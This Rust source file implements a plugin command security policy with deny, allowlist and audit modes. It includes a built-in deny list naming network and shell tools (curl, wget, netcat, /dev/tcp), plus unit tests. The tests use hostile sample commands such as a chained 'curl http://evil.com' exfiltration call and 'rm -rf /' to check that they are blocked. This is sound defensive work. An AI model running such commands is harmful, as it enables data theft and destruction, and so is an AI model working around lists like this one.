//! Plugin security policy — controls which CRD plugin commands are permitted
//! and how plugins are executed.
//!
//! The policy is loaded from `{data_dir}/plugin-policy.yaml`.  When absent the
//! default is **Allowlist** mode with an empty allowlist, which means all plugin
//! commands are rejected until the user explicitly configures permitted
//! command prefixes.

use serde::{Deserialize, Serialize};
use std::path::Path;

// ---------------------------------------------------------------------------
// Policy mode
// ---------------------------------------------------------------------------

/// Determines how plugin commands are evaluated against the policy.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum PluginPolicyMode {
    /// Reject every CRD that declares plugins, regardless of command content.
    Deny,
    /// Accept only commands whose prefix appears in `allowed_command_prefixes`.
    /// An empty allowlist rejects everything (secure-by-default).
    #[default]
    Allowlist,
    /// Accept all commands but emit audit warnings for those that would be
    /// denied under Allowlist mode.  Useful for migration / dry-run.
    Audit,
}

// ---------------------------------------------------------------------------
// PluginPolicy
// ---------------------------------------------------------------------------

/// Top-level plugin security policy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginPolicy {
    /// Policy evaluation mode.  Default: `allowlist`.
    #[serde(default)]
    pub mode: PluginPolicyMode,

    /// Command prefixes accepted when `mode = allowlist`.
    /// Each entry is matched against the **trimmed** command string using
    /// `starts_with`.  Example: `["scripts/", "/usr/local/bin/orchestrator-plugins/"]`.
    #[serde(default)]
    pub allowed_command_prefixes: Vec<String>,

    /// Substring patterns that are **always denied** regardless of mode.
    /// In `audit` mode a warning is emitted instead of rejection.
    ///
    /// When empty, a set of built-in patterns is used (see
    /// [`PluginPolicy::effective_denied_patterns`]).
    #[serde(default)]
    pub denied_patterns: Vec<String>,

    /// Maximum timeout (seconds) any single plugin may request.
    /// Values above this cap are clamped during validation.  Default: 30.
    #[serde(default = "default_max_timeout")]
    pub max_timeout_secs: u64,

    /// Whether lifecycle hooks (`on_create`, `on_update`, `on_delete`) are
    /// subject to the same command policy.  Default: true.
    #[serde(default = "default_true")]
    pub enforce_on_hooks: bool,
}

fn default_max_timeout() -> u64 {
    30
}
fn default_true() -> bool {
    true
}

/// Built-in denied patterns — always active unless the user provides an
/// explicit `denied_patterns` list.
const BUILTIN_DENIED_PATTERNS: &[&str] = &[
    "curl ",
    "curl\t",
    "wget ",
    "wget\t",
    "nc ",
    "nc\t",
    "ncat ",
    "netcat ",
    "eval ",
    "eval\t",
    "base64",
    "/dev/tcp/",
    "/dev/udp/",
];

impl Default for PluginPolicy {
    fn default() -> Self {
        Self {
            mode: PluginPolicyMode::default(),
            allowed_command_prefixes: Vec::new(),
            denied_patterns: Vec::new(),
            max_timeout_secs: default_max_timeout(),
            enforce_on_hooks: true,
        }
    }
}

impl PluginPolicy {
    /// Returns the effective denied-pattern list.  When the user supplies
    /// an explicit list it takes precedence; otherwise the built-in set is used.
    pub fn effective_denied_patterns(&self) -> Vec<&str> {
        if self.denied_patterns.is_empty() {
            BUILTIN_DENIED_PATTERNS.to_vec()
        } else {
            self.denied_patterns.iter().map(|s| s.as_str()).collect()
        }
    }

    /// Evaluate a single command string against this policy.
    ///
    /// Returns `Ok(())` if the command is allowed, or `Err(reason)` if denied.
    /// In `Audit` mode the command is always allowed but the returned
    /// [`PluginPolicyVerdict`] carries warnings.
    pub fn evaluate_command(&self, command: &str) -> PluginPolicyVerdict {
        let trimmed = command.trim();

        // 1. Deny mode: reject unconditionally
        if self.mode == PluginPolicyMode::Deny {
            return PluginPolicyVerdict::Denied {
                reason: "plugin policy mode is 'deny': all plugins are rejected".into(),
            };
        }

        // 2. Check denied patterns (applies to both Allowlist and Audit)
        for pattern in self.effective_denied_patterns() {
            if trimmed.contains(pattern) {
                let reason = format!("command contains denied pattern '{}': {}", pattern, trimmed);
                return match self.mode {
                    PluginPolicyMode::Audit => PluginPolicyVerdict::AuditWarning { reason },
                    _ => PluginPolicyVerdict::Denied { reason },
                };
            }
        }

        // 3. Allowlist check
        if self.mode == PluginPolicyMode::Allowlist {
            let allowed = self
                .allowed_command_prefixes
                .iter()
                .any(|prefix| trimmed.starts_with(prefix.as_str()));
            if !allowed {
                return PluginPolicyVerdict::Denied {
                    reason: format!("command '{}' does not match any allowed prefix", trimmed,),
                };
            }
        }

        PluginPolicyVerdict::Allowed
    }

    /// Evaluate a hook command, respecting `enforce_on_hooks`.
    pub fn evaluate_hook_command(&self, command: &str) -> PluginPolicyVerdict {
        if !self.enforce_on_hooks {
            return PluginPolicyVerdict::Allowed;
        }
        self.evaluate_command(command)
    }
}

// ---------------------------------------------------------------------------
// Verdict
// ---------------------------------------------------------------------------

/// Result of evaluating a command against the plugin policy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PluginPolicyVerdict {
    /// Command is permitted.
    Allowed,
    /// Command is denied — apply must be rejected.
    Denied {
        /// Human-readable reason.
        reason: String,
    },
    /// Command would be denied under strict mode but is allowed because the
    /// policy is in Audit mode.
    AuditWarning {
        /// Human-readable warning.
        reason: String,
    },
}

impl PluginPolicyVerdict {
    /// Returns `true` when the command should be blocked.
    pub fn is_denied(&self) -> bool {
        matches!(self, Self::Denied { .. })
    }

    /// Returns the warning/denial reason, if any.
    pub fn reason(&self) -> Option<&str> {
        match self {
            Self::Allowed => None,
            Self::Denied { reason } | Self::AuditWarning { reason } => Some(reason),
        }
    }
}

// ---------------------------------------------------------------------------
// Loading
// ---------------------------------------------------------------------------

/// Load the plugin policy from `{data_dir}/plugin-policy.yaml`.
///
/// Returns the default policy (Allowlist with empty allowlist) when the file
/// does not exist — which effectively blocks all plugin commands until the
/// operator configures the policy.
pub fn load_plugin_policy(data_dir: &Path) -> anyhow::Result<PluginPolicy> {
    let path = data_dir.join("plugin-policy.yaml");
    if !path.exists() {
        return Ok(PluginPolicy::default());
    }
    let raw = std::fs::read_to_string(&path)
        .map_err(|e| anyhow::anyhow!("failed to read {}: {e}", path.display()))?;
    let policy: PluginPolicy = serde_yaml::from_str(&raw)
        .map_err(|e| anyhow::anyhow!("failed to parse {}: {e}", path.display()))?;
    Ok(policy)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_policy_is_allowlist_empty() {
        let policy = PluginPolicy::default();
        assert_eq!(policy.mode, PluginPolicyMode::Allowlist);
        assert!(policy.allowed_command_prefixes.is_empty());
    }

    #[test]
    fn default_policy_denies_everything() {
        let policy = PluginPolicy::default();
        let v = policy.evaluate_command("scripts/verify.sh");
        assert!(v.is_denied());
    }

    #[test]
    fn allowlist_permits_matching_prefix() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Allowlist,
            allowed_command_prefixes: vec!["scripts/".into(), "/usr/local/bin/".into()],
            ..Default::default()
        };
        assert!(!policy.evaluate_command("scripts/verify.sh").is_denied());
        assert!(!policy.evaluate_command("/usr/local/bin/rotate").is_denied());
        assert!(policy.evaluate_command("rm -rf /").is_denied());
    }

    #[test]
    fn denied_patterns_override_allowlist() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Allowlist,
            allowed_command_prefixes: vec!["scripts/".into()],
            ..Default::default()
        };
        // Even though prefix matches, "curl " is a builtin denied pattern
        let v = policy.evaluate_command("scripts/exfil.sh && curl http://evil.com");
        assert!(v.is_denied());
        assert!(v.reason().unwrap_or("").contains("denied pattern"));
    }

    #[test]
    fn deny_mode_rejects_everything() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Deny,
            ..Default::default()
        };
        let v = policy.evaluate_command("true");
        assert!(v.is_denied());
        assert!(v.reason().unwrap_or("").contains("deny"));
    }

    #[test]
    fn audit_mode_warns_but_allows() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Audit,
            ..Default::default()
        };
        let v = policy.evaluate_command("curl http://evil.com");
        assert!(!v.is_denied());
        assert!(matches!(v, PluginPolicyVerdict::AuditWarning { .. }));
    }

    #[test]
    fn audit_mode_allows_clean_commands() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Audit,
            ..Default::default()
        };
        let v = policy.evaluate_command("scripts/verify.sh");
        assert_eq!(v, PluginPolicyVerdict::Allowed);
    }

    #[test]
    fn hook_command_respects_enforce_flag() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Deny,
            enforce_on_hooks: false,
            ..Default::default()
        };
        assert_eq!(
            policy.evaluate_hook_command("anything"),
            PluginPolicyVerdict::Allowed
        );

        let strict = PluginPolicy {
            mode: PluginPolicyMode::Deny,
            enforce_on_hooks: true,
            ..Default::default()
        };
        assert!(strict.evaluate_hook_command("anything").is_denied());
    }

    #[test]
    fn custom_denied_patterns_override_builtins() {
        let policy = PluginPolicy {
            mode: PluginPolicyMode::Allowlist,
            allowed_command_prefixes: vec!["scripts/".into()],
            denied_patterns: vec!["DANGEROUS".into()],
            ..Default::default()
        };
        // curl is no longer denied (builtins overridden)
        assert!(
            !policy
                .evaluate_command("scripts/curl_wrapper.sh")
                .is_denied()
        );
        // custom pattern IS denied
        assert!(
            policy
                .evaluate_command("scripts/DANGEROUS_thing.sh")
                .is_denied()
        );
    }

    #[test]
    fn max_timeout_has_sane_default() {
        let policy = PluginPolicy::default();
        assert_eq!(policy.max_timeout_secs, 30);
    }

    #[test]
    fn load_missing_file_returns_default() {
        let tmp = tempfile::tempdir().unwrap();
        let policy = load_plugin_policy(tmp.path()).unwrap();
        assert_eq!(policy.mode, PluginPolicyMode::Allowlist);
    }

    #[test]
    fn load_policy_from_file() {
        let tmp = tempfile::tempdir().unwrap();
        let content = r#"
mode: audit
allowed_command_prefixes:
  - scripts/
max_timeout_secs: 60
"#;
        std::fs::write(tmp.path().join("plugin-policy.yaml"), content).unwrap();
        let policy = load_plugin_policy(tmp.path()).unwrap();
        assert_eq!(policy.mode, PluginPolicyMode::Audit);
        assert_eq!(policy.allowed_command_prefixes, vec!["scripts/"]);
        assert_eq!(policy.max_timeout_secs, 60);
    }
}
